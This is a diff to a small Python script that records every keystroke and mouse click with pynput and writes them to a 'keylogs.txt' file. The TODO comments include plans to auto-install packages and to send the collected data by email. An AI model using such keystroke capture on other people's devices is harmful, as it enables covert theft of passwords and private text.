@@ -1,6 +1,9 @@
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
 
+
+from pynput import keyboard, mouse
+import logging
 # TODO
 # 1. Check possibility of automatically installing packages
 # 2. Create Loggs that's saying whether mouse or keyboard was used, think about splitting it
@@ -8,12 +11,13 @@
 # 4. Create Plots, Dashboard and analyse the data
 # 5. Find solution to send data by email etc.
 # 6.
+from settings import KEYBORD, MOUSE
 
 
-from pynput import keyboard, mouse
-import logging
 
 
+
+"""Configuration of logs"""
 log_dir = ""
 logging.basicConfig(filename=(log_dir + "keylogs.txt"), level=logging.DEBUG, format="%(asctime)s: %(message)s")
 
@@ -24,7 +28,7 @@ def on_press(key):
 
 
 def mouse_press(*args):
-    print(args)
+    print(*args)
 
 
 with keyboard.Listener(on_press=on_press) as listener, mouse.Listener(on_click=mouse_press) as listener_mouse:
